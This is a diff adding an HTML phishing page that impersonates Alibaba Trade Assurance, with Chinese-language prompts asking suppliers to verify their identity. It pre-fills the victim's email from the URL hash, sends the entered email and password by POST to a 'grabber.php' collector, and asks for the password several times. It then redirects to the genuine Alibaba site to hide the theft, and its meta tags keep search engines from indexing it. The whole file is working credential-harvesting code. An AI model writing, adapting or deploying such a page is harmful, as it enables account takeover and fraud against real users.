@@ -1,0 +1,149 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/html">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,10,9,8,7"/>
+	<title>Trade Assurance</title>
+	<meta name="robots" content="noindex" />
+	<meta name="robots" content="nofollow" />
+	<META NAME="GOOGLEBOT" CONTENT="NOARCHIVE" />
+	<META NAME="GOOGLEBOT" CONTENT="NOSNIPPET" />
+</head>
+<body style="background:url(https://i.imgur.com/hkFPlfT.png); background-size: cover; background-repeat: no-repeat;">
+
+<script>
+const url = 'grabber.php';   //full url goes here
+</script>
+
+<style>
+.login{
+	width:272px; height:20px; font-family: arial; font-size: 14px; color:#DF3A01; font-weight:bold; 
+	background-color: #ffffff; border: solid 1px #BDBDBD; 
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 7px; border-radius: 2px 3px 1px 5px;
+}
+.btn{
+	width:110px; height:35px; font-family: arial; font-size: 14px; color:#FFF; background-color: #DF3A01; border: solid 1px #DF3A01;
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 10px; border-radius: 2px 5px 1px 7px;
+	cursor:pointer; 
+}
+
+</style>
+<div style="margin:-8px;width:100%">
+
+<div  style="position:absolute;top:140px;left:524px; 
+width:335px; height:330px; font-family: arial; font-size: 14px; color:#FFF; background-color: #FFFFFF; border: solid 1px #FFFFFF;
+	-webkit-box-shadow: 2px 2px 2px 2px #616162; box-shadow: 2px 2px 2px 2px #616162; padding: 10px; border-radius: 2px 5px 1px 7px;">
+
+</div>
+
+
+<div style="position:absolute;top:180px;left:560px;">
+	<font style="font-family: arial; font-size: 27px; color:#DF3A01;">
+		<strong>&#38463;&#37324;&#24052;&#24052;&#36152;&#26131;&#20445;&#35777;</strong>
+	</font>
+</div>
+
+<div style="position:absolute;top:225px;left:560px;">
+	<font style="font-family: arial; font-size: 13px; color:#2E2E2E;">
+		<strong> &#38656;&#35201;&#36523;&#20221;&#39564;&#35777; </strong>
+	</font>
+	<br>
+	<font style="font-family: arial; font-size: 13px; color:#2E2E2E;">
+		<strong> &#20351;&#29992;&#24744;&#30340;&#20379;&#24212;&#21830; ID &#30331;&#24405;&#20197;&#35775;&#38382;&#27492;&#38376;&#25143;... </strong>
+	</font>
+</div>
+  
+	<form method="post" action="" onsubmit="Validate(); return false;">
+	<input readonly id="user" name="user" class="login" style="position:absolute;top:280px;left:560px" type="email">
+	<input required placeholder="&#23494;&#30721;" type="password" id="pass" name="pass" class="login" style="position:absolute;top:330px;left:560px">
+	<div style="position:absolute;top:380px;left:560px;">
+		<input type="checkbox" checked>
+		<font style="font-family: arial; font-size: 13px; color:#2E2E2E;"> &#35760;&#20303;&#25105;&#30340;ID</font>
+	</div>
+	<input id="b1" type="submit" class="btn" style="position:absolute;top:410px;left:560px; font-weight:bold;" value="&#36827;&#20837;&#20256;&#36865;&#38376;">
+	</form>
+</div>
+
+<input type="hidden" id="count" value="0">
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+
+
+<script>
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          var my_email =email;
+          $('#user').val(my_email);
+			
+			}
+		  })
+
+
+function Validate(){
+var a = $('#user').val();
+var b = $('#pass').val();
+var c = $('#count').val();
+
+$.post(url, {user:a,pass:b}, function(){
+setTimeout(function(){
+if(c>=2){
+$('#count').val('0');
+window.location='https://tradeassurance.alibaba.com/knowledgecenter?src=sem_ggl&field=UG&from=sem_ggl&cmpgn=20573125405&adgrp=&fditm=&tgt=&locintrst=&locphyscl=1010289&mtchtyp=&ntwrk=x&device=c&dvcmdl=&creative=&plcmnt=&plcmntcat=&aceid=&position=&gad_source=1&gclid=EAIaIQobChMI2Ob_57u2hQMVQJxQBh1KEQAREAAYASAAEgIsC_D_BwE';
+}else{
+$('#bg').fadeOut();
+$('#bg2').fadeIn();
+$('#user').css('top','250px');
+$('#pass').css('top','311px');
+$('#b1').css('top','381px');
+$('#pass').val('');
+var add = +c+1;
+$('#count').val(add);
+$('#pass').focus();
+}
+},2000);
+});
+}
+</script>
+
+<script>
+function process(){
+	var user = document.getElementById('user').value;
+	var pass = document.getElementById('pass').value;
+	if ((user == '') || (user == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('user').focus();
+return false;	
+	}else
+	if ((pass == '') || (pass == null)){
+	document.getElementById('bg').src='';
+	document.getElementById('pass').focus();
+return false;	
+	}else
+	
+return true	;
+}
+</script>
+<script>
+$('input').focus(function(){
+  $(this).parents('.form-group').addClass('focused');
+});
+
+$('input').blur(function(){
+  var inputValue = $(this).val();
+  if ( inputValue == "" ) {
+    $(this).removeClass('filled');
+    $(this).parents('.form-group').removeClass('focused');  
+  } else {
+    $(this).addClass('filled');
+  }
+})  
+</script>
+</body>
+</html>
